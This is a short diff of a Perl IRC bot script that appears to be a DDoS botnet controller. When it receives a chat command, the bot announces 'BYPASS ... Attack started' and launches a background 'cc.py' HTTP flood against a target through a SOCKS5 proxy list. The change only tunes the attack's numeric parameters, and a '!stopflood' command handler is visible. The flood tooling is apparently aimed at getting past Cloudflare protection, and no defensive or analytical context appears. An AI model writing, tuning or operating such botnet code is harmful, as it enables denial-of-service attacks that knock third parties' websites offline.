@@ -52,7 +52,7 @@ while ( my $log = <$s0ck3t> ) {
         my $target_cf = $1;
         $target_cf =~ s/^\s*(.*?)\s*$/$1/;
         print $s0ck3t "PRIVMSG $channel :67[63BYPASS67]61 Attack started at $1!\r\n";
-        system("python3 cc.py cc $target_cf n 5 999 y socks5.txt n 100 y > /dev/null 2>&1 &");
+        system("python3 cc.py cc $target_cf n 5 666 y socks5.txt n 400 y > /dev/null 2>&1 &");
       }
 
       if ( $log =~ m/:!stopflood/g ){##########
